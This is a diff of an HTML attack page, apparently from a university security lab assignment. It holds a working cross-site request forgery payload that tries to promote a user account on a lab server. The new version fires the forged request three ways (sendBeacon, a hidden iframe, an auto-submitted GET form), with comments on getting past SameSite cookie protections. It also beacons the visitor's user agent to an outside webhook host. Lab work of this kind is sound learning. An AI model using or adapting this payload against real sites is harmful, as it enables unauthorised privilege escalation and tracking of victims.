@@ -3,11 +3,23 @@
 <head><meta charset="utf-8"></head>
 <body>
 <script>
+var T = 'https://10.20.18.55:2070/labs/assignment03/environment/1/api/users/20211381/promote';
 var W = 'https://golden-sparrow-81.webhook.cool';
-var T = 'https://10.20.18.55:2070/labs/assignment03/environment/1/?view=admin&request=x/../../users/20211381/promote';
-var qs = '?v4=1&ua=' + encodeURIComponent(navigator.userAgent);
-try { new Image().src = W + '/v4-loaded' + qs; } catch(e) {}
-setTimeout(function(){ location.replace(T); }, 800);
+try { new Image().src = W + '/v5?ua=' + encodeURIComponent(navigator.userAgent); } catch(e) {}
+
+// 1) sendBeacon POST — cookies attached on browsers that ignore SameSite (<50)
+try { navigator.sendBeacon(T, '{}'); } catch(e) {}
+
+// 2) cross-site iframe GET — cookies attached on browsers that ignore SameSite (<50)
+try { var i = document.createElement('iframe'); i.style.display='none'; i.src = T; document.body.appendChild(i); } catch(e) {}
+
+// 3) top-level GET form navigation — cookies attached under SameSite=Lax in ALL browsers
+setTimeout(function(){
+  try {
+    var f = document.createElement('form'); f.method = 'GET'; f.action = T;
+    document.body.appendChild(f); f.submit();
+  } catch(e) {}
+}, 1200);
 </script>
 </body>
 </html>
